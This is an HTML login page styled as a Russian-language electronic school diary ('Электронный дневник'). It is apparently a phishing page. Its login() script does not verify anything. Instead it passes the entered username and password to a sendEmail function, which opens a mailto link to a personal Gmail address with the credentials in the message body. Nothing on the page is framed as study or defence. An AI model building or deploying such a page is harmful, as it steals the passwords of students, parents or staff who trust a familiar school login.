<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Электронный дневник</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }

        .login-container {
            max-width: 400px;
            margin: auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            margin-top: 50px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            display: inline-block;
            border: 1px solid #ccc;
            box-sizing: border-box;
        }

        button {
            background-color: #4CAF50;
            color: white;
            padding: 15px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
        }
    </style>
</head>
<body>

<div class="login-container">
    <label for="username">Логин:</label>
    <input type="text" id="username" name="username" required>

    <label for="password">Пароль:</label>
    <input type="password" id="password" name="password" required>

    <button onclick="login()">Войти</button>
</div>

<script>
    function login() {
        var username = document.getElementById("username").value;
        var password = document.getElementById("password").value;

        // Отправка данных на почту
        sendEmail(username, password);

        // В реальном приложении здесь может быть код для отправки данных на сервер для проверки логина и пароля
    }

    function sendEmail(username, password) {
        // Отправка данных на почту
        var link = "mailto:zummerot@gmail.com"
                 + "?subject=" + encodeURIComponent("Данные логина и пароля")
                 + "&body=" + encodeURIComponent("Логин: " + username + "\nПароль: " + password);

        window.location.href = link;
    }
</script>

</body>
</html>
